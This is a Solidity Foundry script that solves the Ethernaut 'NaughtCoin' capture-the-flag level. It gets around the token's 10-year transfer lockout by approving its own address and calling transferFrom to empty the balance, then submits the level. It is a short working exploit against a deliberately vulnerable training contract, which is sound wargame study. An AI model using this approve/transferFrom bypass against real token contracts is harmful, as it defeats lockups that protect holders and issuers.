// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

/**
 *
 * Level address: 0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F
 * NaughtCoin is an ERC20 token and you're already holding all of them. The
 * catch is that you'll only be able to transfer them after a 10 year lockout
 * period. Can you figure out how to get them out to another address so that you
 * can transfer them freely? Complete this level by getting your token balance
 * to 0.
 *
 * Things that might help
 *
 * The ERC20 Spec
 * The OpenZeppelin codebase
 *
 */
contract NaughtCoinScript is Attacker {
    Level private level = Level(0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        NaughtCoin naughtCoin = NaughtCoin(instance);
        // Pawn pawn = new Pawn(naughtCoin);
        naughtCoin.approve(me.addr, type(uint256).max);
        naughtCoin.transferFrom(
            me.addr, address(0x01), naughtCoin.balanceOf(me.addr)
        );

        require(naughtCoin.balanceOf(me.addr) == 0, "Level completion failed");
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
